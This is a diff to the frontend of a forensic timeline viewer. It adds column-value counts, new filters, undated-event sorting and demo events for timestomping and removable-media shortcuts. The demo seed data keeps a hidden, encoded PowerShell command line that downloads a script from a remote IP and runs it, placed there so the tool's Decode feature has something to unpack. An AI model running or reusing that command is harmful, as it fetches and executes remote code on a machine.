@@ -39,6 +39,8 @@ export const backend = {
     call("ingest_collection", { collectionDir: collection_dir, casePath: case_path, caseName: case_name, examiner }),
   queryTimeline: (filter) => call("query_timeline", { filter: withHost(filter) }),
   countTimeline: (filter) => call("count_timeline", { filter: withHost(filter) }),
+  // The Host menu lists every host; the others respect the host being viewed.
+  columnValues: (filter, field) => call("column_values", { filter: field === "host" ? Object.assign({}, filter, { host: null }) : withHost(filter), field }),
   eventRaw: (event_id) => call("event_raw", { eventId: event_id }),
   runHunt: (rules_dir) => call("run_hunt", { rulesDir: rules_dir || null }),
   huntResults: () => call("hunt_results", {}),
@@ -172,6 +174,20 @@ let SEED = [
 // Demo: give the encoded PowerShell event a real command line so Decode has something to peel.
 SEED[SEED.length - 1]._raw = { EventID: 4688, NewProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
   CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAvAGEALgBwAHMAMQAnACkA" };
+// Demo: an $MFT entry whose $SI Born predates its $FN Born (timestomped), and
+// a shell link with no time at all (undated: shown as "no timestamp").
+(function demoTimes() {
+  const si = { modified: "2019-03-01 0:00:00.0 +00:00:00", accessed: "2026-02-11 2:15:40.5310 +00:00:00", changed: "2026-02-11 2:15:41.0712 +00:00:00", born: "2019-03-01 0:00:00.0 +00:00:00" };
+  const fn = { modified: "2026-02-11 2:15:00.8841 +00:00:00", accessed: "2026-02-11 2:15:00.8841 +00:00:00", changed: "2026-02-11 2:15:00.8841 +00:00:00", born: "2026-02-11 2:15:00.8841 +00:00:00" };
+  const a = ev(T(2,15,0), "filesystem", "file.timestomp_suspected", "Mft", null, "Possible timestomping: $SI Born 2019-03-01 00:00:00 is earlier than $FN Born 2026-02-11 02:15:00; $SI times have no sub-second part but $FN times do: Users/Public/svc.exe  [ANTI-FORENSIC]", true, "ANTI-FORENSIC");
+  a.ts_kind = "created"; a._rawTop = { entry: 88123, path: "Users/Public/svc.exe", si, fn, signals: ["$SI Born earlier than $FN Born"] };
+  const b = ev(T(2,15,41), "filesystem", "file.metadata_changed", "Mft", null, "$SI metadata_changed: Users/Public/svc.exe", false);
+  b.ts_kind = "metadatachanged"; b._rawTop = { entry: 88123, path: "Users/Public/svc.exe", si, fn };
+  const c = ev("", "other", "file.shortcut", "Lnk", null, "Shell link -> E:\\Tools\\stage.zip  [REMOVABLE-MEDIA]", false);
+  c.ts_kind = "undated";
+  SEED.push(a, b, c);
+})();
+
 
 // pad with routine noise so virtualization is real (a few thousand rows)
 (function pad() {
@@ -184,7 +200,7 @@ SEED[SEED.length - 1]._raw = { EventID: 4688, NewProcessName: "C:\\Windows\\Syst
     const t = new Date(base + i * 15000).toISOString().replace(".000","");
     SEED.push(ev(t, a[0], a[1], a[2], null, `${a[1]}: C:\\Windows\\System32\\${names[i%names.length]}`, false));
   }
-  SEED.sort((x, y) => x.ts.localeCompare(y.ts));
+  SEED.sort((x, y) => ((x.ts || "~") < (y.ts || "~") ? -1 : (x.ts || "~") > (y.ts || "~") ? 1 : 0)); // undated last
 })();
 
 function ev(ts, category, action, artefact, user, message, flagged, tag) {
@@ -262,7 +278,7 @@ function addDemoHost() {
     const e = ev(new Date(base + i * 20000).toISOString().replace(".000",""), a[0], a[1], a[2], null, `${a[1]}: C:\\Windows\\System32\\${["lsass.exe","dns.exe","dfsrs.exe","svchost.exe"][i % 4]}`, false);
     e.host = HN.dc; SEED.push(e);
   }
-  SEED.sort((x, y) => x.ts.localeCompare(y.ts));
+  SEED.sort((x, y) => ((x.ts || "~") < (y.ts || "~") ? -1 : (x.ts || "~") > (y.ts || "~") ? 1 : 0));
   DEMO_HOSTS.push({ key: "dc", host_source: "SYSTEM hive ComputerName",
     collections: [{ collection_id: "c2", source_root: "C:\\cases\\demo-collection", ingested_utc: "2026-02-12T10:30:00", files: 188 }] });
   return true;
@@ -303,9 +319,29 @@ function sample(cmd, args) {
   if (cmd === "query_timeline") {
     return Promise.resolve(applyFilter(SEED, args.filter));
   }
+  if (cmd === "column_values") {
+    const f = Object.assign({}, args.filter, { limit: 1e9, offset: 0 });
+    if (args.field === "label") {
+      const f2 = Object.assign({}, args.filter, { limit: 1e9, offset: 0, label: null });
+      const vis = new Set(applyFilter(SEED, f2).map((e) => e.id)), c = {};
+      SAMPLE_LABELS.forEach((l) => { if (vis.has(l.event_id)) c[l.tag] = (c[l.tag] || 0) + 1; });
+      return Promise.resolve(Object.entries(c).map(([label, count]) => ({ label, count })));
+    }
+    if (args.field === "triage") {
+      const f2 = Object.assign({}, args.filter, { limit: 1e9, offset: 0, triage: null });
+      const vis = new Set(applyFilter(SEED, f2).map((e) => e.id)), c = {};
+      DEMO_TRIAGE.forEach((t) => { if (vis.has(t.event_id)) c[t.triage_state] = (c[t.triage_state] || 0) + 1; });
+      return Promise.resolve(Object.entries(c).map(([label, count]) => ({ label, count })));
+    }
+    const key = { host: "host", kind: "ts_kind", artefact: "artefact", user: "user" }[args.field];
+    delete f[args.field === "host" ? "host" : args.field];
+    const counts = {};
+    applyFilter(SEED, f).forEach((e) => { const v = e[key]; if (v) counts[v] = (counts[v] || 0) + 1; });
+    return Promise.resolve(Object.entries(counts).map(([label, count]) => ({ label, count })).sort((a, b) => b.count - a.count));
+  }
   if (cmd === "count_timeline") {
     // Demo: count is the full filtered set (before paging).
-    const f = Object.assign({}, args.filter); delete f.limit; delete f.offset;
+    const f = Object.assign({}, args.filter, { limit: 1e9, offset: 0 });
     return Promise.resolve(applyFilter(SEED, f).length);
   }
   if (cmd === "event_raw") {
@@ -547,6 +583,10 @@ function applyFilter(rows, f = {}) {
   if (f.ioc) { const q = String(f.ioc).toLowerCase();
     out = out.filter((e) => (e.message || "").toLowerCase().includes(q)); }
   if (f.host) out = out.filter((e) => e.host === f.host);
+  if (f.kind) out = out.filter((e) => e.ts_kind === f.kind);
+  if (f.label) { const ids = new Set(SAMPLE_LABELS.filter((l) => l.tag === f.label).map((l) => l.event_id)); out = out.filter((e) => ids.has(e.id)); }
+  if (f.triage) { const ids = new Set(DEMO_TRIAGE.filter((t) => t.triage_state === f.triage).map((t) => t.event_id)); out = out.filter((e) => ids.has(e.id)); }
+  if (f.user) out = out.filter((e) => e.user === f.user);
   if (f.artefact) out = out.filter((e) => e.artefact === f.artefact);
   if (f.category) out = out.filter((e) => e.category === f.category);
   if (f.flagged_only) out = out.filter((e) => e.flagged);
@@ -561,6 +601,7 @@ function overview(host) {
     case_id: "c0ffee00-1a2b-4c3d-8e9f-000000000001",
     total_events: rows.length,
     by_artefact: Object.entries(by).map(([label, count]) => ({ label, count })).sort((a,b)=>b.count-a.count),
+    by_category: ["execution", "persistence", "filesystem", "network", "logon"].map((c) => ({ label: c, count: rows.filter((e) => e.category === c).length })),
     ingest: [{ label: "parsed", count: 11 }, { label: "unsupported", count: 2 }, { label: "failed", count: 0 }],
     srum_top_talkers: host && host === HN.dc ? [] : [
       { app: "c:\\programdata\\upd.exe", user: "S-1-5-21…-1013", bytes_sent: 4831838208, bytes_recv: 20551 },
@@ -575,5 +616,5 @@ function rawFor(e) {
   return { artefact: e.artefact, action: e.action, timestamp: e.ts, timestamp_kind: e.ts_kind,
     host: e.host, user: e.user, message: e.message,
     provenance: { parser: e.artefact.toLowerCase(), source_path: `triage/${e.artefact}`, note: "sample data — no real evidence" },
-    flagged: e.flagged, tag: e._tag, ...(e._raw ? { event_data: e._raw } : {}) };
+    flagged: e.flagged, tag: e._tag, ...(e._raw ? { event_data: e._raw } : {}), ...(e._rawTop || {}) };
 }
